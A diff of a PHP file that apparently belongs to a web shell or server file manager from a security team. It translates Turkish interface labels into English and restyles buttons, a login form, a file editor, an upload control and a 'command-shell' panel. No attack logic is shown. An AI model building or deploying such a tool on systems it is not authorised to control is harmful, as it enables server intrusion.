                 <input type="hidden" name="filePath" value="' . htmlspecialchars($fileToEdit) . '">
                 <br>
-                <button type="submit" name="saveFile" class="kaydet">Kaydet</button>
-                <button type="button" onclick="history.back()" class="geri-buton">Geri</button> 
+                <button type="submit" name="saveFile" class="kaydet">Save</button>
+                <button type="button" onclick="history.back()" class="geri-buton">Back</button> 
             </form>
         </div>';
 
 echo '<style>';
 echo '
 .geri-buton {
-    font-size: 12px;
-    padding: 9px 8px;
-    color: greygreen;
-    margin: 0px;
-    border-radius: 5px; 
-    cursor: pointer; 
+    /* Mevcut stiller korunur */
+    padding: 9px 15px;
+    background-color: #00ff00;
+    color: black;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background-color 0.3s;
+    text-decoration: none;
+    display: inline-flex;
+    align-items: center;
     
+    /* Manuel pozisyon için eklenecek stiller: */
+    position: relative;  /* veya absolute */
+    left: 20px;         /* Sağa/sola kaydırma */
+    top: 1px;          /* Yukarı/aşağı kaydırma */
+    
+    /* VEYA margin ile: */
+    margin-left: 5px;  /* Soldan boşluk */
+    margin-top: 20px;   /* Üstten boşluk */
+    margin-right: 20px; /* Sağdan boşluk */
+    margin-bottom: 20px;/* Alttan boşluk */
+    
+    /* VEYA tek satırda margin: */
+    margin: 40px 20px 20px -10px; /* üst sağ alt sol */
 }
-
 
 .geri-buton:hover {
-    background-color: #45a049;
+    background-color: #00cc00; /* Match hover color */
 }
 
-
-.kaydet, .geri-buton {
+.geri-buton {
     display: inline-block; 
     margin-top: 10px; 
 }
-
 
 .edit-form-container {
     background-color: black; 
@@ -885,7 +1072,18 @@ echo '
 }
 
 .kaydet {
-    padding: 10px 20px; 
+    padding: 10px 20px; /* Match padding with .search-form button */
+    background-color: #00ff00; /* Match background color */
+    color: black; /* Match text color */
+    border: none; /* Remove border */
+    border-radius: 5px; /* Match border radius */
+    cursor: pointer; /* Pointer cursor */
+    font-size: 1rem; /* Match font size */
+    transition: background-color 0.3s; /* Match transition */
+}
+
+.kaydet:hover {
+    background-color: #00cc00; /* Match hover color */
 }
 
 textarea {
@@ -922,14 +1120,14 @@ echo '</style>';
         <span class="neon-text">Yavuzlar Web Security Team</span>
     </div>';
     echo '<div class="login-container">';
-    echo '<h2>Giriş Yap</h2>';
+    echo '<h2>Login</h2>';
     if (isset($error)) {
         echo '<div class="error-message">' . $error . '</div>'; 
     }
     echo '<form method="post" action="">
-            <input type="text" name="username" placeholder="Kullanıcı Adı" required>
-            <input type="password" name="password" placeholder="Şifre" required>
-            <input type="submit" value="Giriş Yap">
+            <input type="text" name="username" placeholder="Username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <input type="submit" value="Login">
           </form>';
     
     echo '</div>';
@@ -1031,19 +1229,20 @@ body {
 }
 
 .std-button {
-    color: #0f0;
-    border: 1px solid #0f0;
-    padding: 6px 12px;
-    border-radius: 3px;
-    cursor: pointer;
-    transition: all 0.3s ease;
-    background: transparent;
-    font-size: 0.85rem;
-    height: 39px;
-    line-height: 1;
-    display: inline-flex;
-    align-items: center;
-    justify-content: center;
+    padding: 10px 20px; /* Match padding with .search-form button */
+    background-color: #00ff00; /* Match background color */
+    color: black; /* Match text color */
+    border: none; /* Remove border */
+    border-radius: 5px; /* Match border radius */
+    cursor: pointer; /* Pointer cursor */
+    font-size: 1rem; /* Match font size */
+    transition: background-color 0.3s; /* Match transition */
+    min-width: 120px; /* Set a minimum width for consistent button size */
+    height: 39px; /* Keep the height the same as before */
+}
+
+.std-button:hover {
+    background-color: #00cc00; /* Match hover color */
 }
 
 .neon-text {
@@ -1285,23 +1484,23 @@ input[type="submit"]:hover {
 
 
 .back-button {
-    color: #0f0; /* Text color */
-    border: 1px solid #0f0; /* Border color */
-    border-radius: 3px; /* Rounded corners */
+    padding: 5px 15px; /* Match padding with .search-form button */
+    background-color: #00ff00; /* Match background color */
+    color: black; /* Match text color */
+    border: none; /* Remove border */
+    border-radius: 5px; /* Match border radius */
     cursor: pointer; /* Pointer cursor */
-    transition: all 0.3s ease; /* Transition effects */
-    background: transparent; /* Transparent background */
-    font-size: 0.85rem; /* Font size */
-    height: 30px; /* Height */
-    width: 80px; /* Width */
+    font-size: 1rem; /* Match font size */
+    transition: background-color 0.3s; /* Match transition */
+    min-width: 10px; /* Set a minimum width for consistent button size */
+    text-decoration: none; /* Remove underline for link */
     display: inline-flex; /* Flex display */
     align-items: center; /* Center vertically */
     justify-content: center; /* Center text horizontally */
-    text-decoration: none; /* Remove underline */
 }
 
 .back-button:hover {
-    background-color: #218838; /* Darker green on hover */
+    background-color: #00cc00; /* Match hover color */
 }
 ::-webkit-scrollbar {
     width: 12px;
@@ -1342,16 +1541,24 @@ input[type="submit"]:hover {
     
 }
 
-.search-form button{
-    width: 60px; 
-    height: 35px; 
-          ;
-    margin-left: 10px;
-    
-        
+.search-form button {
+    padding: 10px 20px; /* Match padding with .form-button */
+    background-color: #00ff00; /* Match background color */
+    color: black; /* Match text color */
+    border: none; /* Remove border */
+    border-radius: 5px; /* Match border radius */
+    cursor: pointer; /* Pointer cursor */
+    font-size: 1rem; /* Match font size */
+    transition: background-color 0.3s; /* Match transition */
+    min-width: 120px; /* Set a minimum width for consistent button size */
+    margin-left: 10px; /* Space between input and button */
+    margin-top: 2px; /* Adjust vertical position (decrease this value to move up) */
+    margin-right: 15px; /* Adjust right position */
 }
 
-
+.search-form button:hover {
+    background-color: #00cc00; /* Match hover color */
+}
 
 .footer {
     text-align: center;
@@ -1500,13 +1707,21 @@ button:hover {
 }
 
 .sec {
-    display: inline-block; 
-    margin-top: 0px;
-    margin-left: 0px;
-    margin-bottom: 5px;
-    color: #00FF00; 
-    cursor: pointer;
-    margin-right: 4px; 
+    padding: 10px 20px; /* Match padding with buttons */
+    background-color: #00ff00; /* Match background color */
+    color: black; /* Match text color */
+    border: none; /* Remove border */
+    border-radius: 5px; /* Match border radius */
+    cursor: pointer; /* Pointer cursor */
+    font-size: 1rem; /* Match font size */
+    transition: background-color 0.3s; /* Match transition */
+    display: inline-flex; /* Flex display */
+    align-items: center; /* Center vertically */
+    justify-content: center; /* Center text horizontally */
+}
+
+.upload-form label.sec:hover {
+    background-color: #00cc00; /* Match hover color */
 }
 
 .tes{
@@ -1524,8 +1739,140 @@ button:hover {
     padding: 10px 20px;
 }
 
+.neon-box {
+    background: rgba(0, 0, 0, 0.9);
+    border: 2px solid #00ff00;
+    border-radius: 15px;
+    padding: 15px;
+    margin: 15px auto;
+    max-width: 900px;
+    width: 80%;
+    box-shadow: 0 0 15px rgba(0, 255, 0, 0.3),
+                inset 0 0 10px rgba(0, 255, 0, 0.2);
+}
 
+.section-title {
+    color: #00ff00;
+    font-size: 1.6rem;
+    text-align: center;
+    margin: 10px 0;
+    padding: 10px;
+    border-bottom: 2px solid #00ff00;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    font-weight: 600;
+    text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+}
 
+.section-title i {
+    font-size: 1.8rem;
+    margin-right: 10px;
+}
+
+.config-table {
+    width: 100%;
+    border-collapse: separate;
+    border-spacing: 0;
+    margin: 15px 0;
+    background: rgba(0, 0, 0, 0.7);
+    border-radius: 10px;
+    overflow: hidden;
+}
+
+.config-table thead {
+    background: rgba(0, 255, 0, 0.1);
+}
+
+.config-table th {
+    padding: 12px;
+    color: #00ff00;
+    font-size: 1rem;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    border-bottom: 2px solid #00ff00;
+}
+
+.config-table th i {
+    margin-right: 8px;
+    font-size: 1.1rem;
+}
+
+.config-table tr:hover {
+    background: rgba(0, 255, 0, 0.05);
+}
+
+.config-table td {
+    padding: 8px 12px;
+    color: #fff;
+    border-bottom: 1px solid rgba(0, 255, 0, 0.1);
+}
+
+.config-table tr:last-child td {
+    border-bottom: none;
+}
+
+.command-shell {
+    background: rgba(0, 0, 0, 0.9);
+    border: 2px solid #00ff00;
+    border-radius: 15px;
+    padding: 15px;
+    margin: 15px auto;
+    max-width: 900px;
+    width: 80%;
+    box-shadow: 0 0 15px rgba(0, 255, 0, 0.3),
+                inset 0 0 10px rgba(0, 255, 0, 0.2);
+}
+
+.command-shell h1 {
+    color: #00ff00;
+    font-size: 1.6rem;
+    text-align: center;
+    margin: 10px 0;
+    padding: 10px;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    font-weight: 600;
+    text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+}
+
+.form-input {
+    padding: 10px;
+    width: 80%;
+    max-width: 400px;
+    border: 1px solid #00ff00;
+    border-radius: 5px;
+    background-color: #222;
+    color: #00ff00;
+    font-size: 1rem;
+    transition: border-color 0.3s;
+}
+
+.form-input:focus {
+    border-color: #00cc00;
+    outline: none;
+}
+
+.form-button {
+    padding: 10px 20px;
+    margin-top: 10px;
+    background-color: #00ff00;
+    color: black;
+    border: none;
+    border-radius: 5px;
+    cursor: pointer;
+    font-size: 1rem;
+    transition: background-color 0.3s;
+    min-width: 120px;
+}
+
+.form-button:hover {
+    background-color: #00cc00;
+}
 </style>
     <script>
         function displayFileName() {
@@ -1536,7 +1883,7 @@ button:hover {
                 const fileName = fileInput.files[0].name; // Get the file name
                 fileNameDisplay.innerText = fileName; // Update the label text
             } else {
-                fileNameDisplay.innerText = 'Dosya Seç'; // Reset to default text if no file is selected
+                fileNameDisplay.innerText = 'Select File'; // Reset to default text if no file is selected
             }
         }
     </script>
